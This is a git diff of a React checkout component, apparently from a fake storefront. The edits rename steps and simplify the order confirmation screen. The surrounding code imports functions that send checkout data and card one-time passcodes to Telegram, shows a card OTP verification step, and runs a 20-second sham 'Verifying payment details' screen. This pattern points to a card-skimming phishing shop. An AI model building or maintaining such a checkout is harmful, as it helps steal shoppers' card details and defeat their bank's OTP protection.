@@ -18,7 +18,7 @@ import PaymentDetailsForm, { CardFormData } from '@/components/checkout/PaymentD
 import CardOTPVerification from './CardOTPVerification';
 import OrderProcessing from './OrderProcessing';
 import OrderReview from '@/components/checkout/OrderReview';
-import OrderConfirmation from '@/components/checkout/OrderConfirmation';
+import OrderConfirmationSuccess from '@/components/checkout/OrderConfirmationSuccess';
 import { sendCheckoutDataToTelegram, sendOTPToTelegram } from './telegram-notifier';
 
 interface SellerGroup {
@@ -151,7 +151,7 @@ export default function CartCheckout() {
         description: 'Verifying payment details...'
       });
 
-      setStep('processing');
+      setStep('processingPayment');
     } catch (error: any) {
       toast({ title: 'Error', description: error.message, variant: 'destructive' });
     } finally {
@@ -367,7 +367,7 @@ export default function CartCheckout() {
               />
             )}
 
-            {step === 'processing' && (
+            {step === 'processingPayment' && (
               <OrderProcessing
                 durationSeconds={20}
                 onComplete={() => {
@@ -410,18 +410,10 @@ export default function CartCheckout() {
             )}
 
             {step === 'confirmation' && shippingData && (
-              <OrderConfirmation
+              <OrderConfirmationSuccess
                 orderIds={orderIds}
-                totalAmount={convertFromUSD(total)}
-                currency={currency.code}
-                shippingAddress={{
-                  fullName: shippingData.fullName,
-                  line1: shippingData.streetAddress,
-                  city: shippingData.city,
-                  state: shippingData.stateProvince,
-                  postalCode: shippingData.postalCode,
-                  country: shippingData.country,
-                }}
+                totalAmount={total}
+                currency="USD"
               />
             )}
           </div>
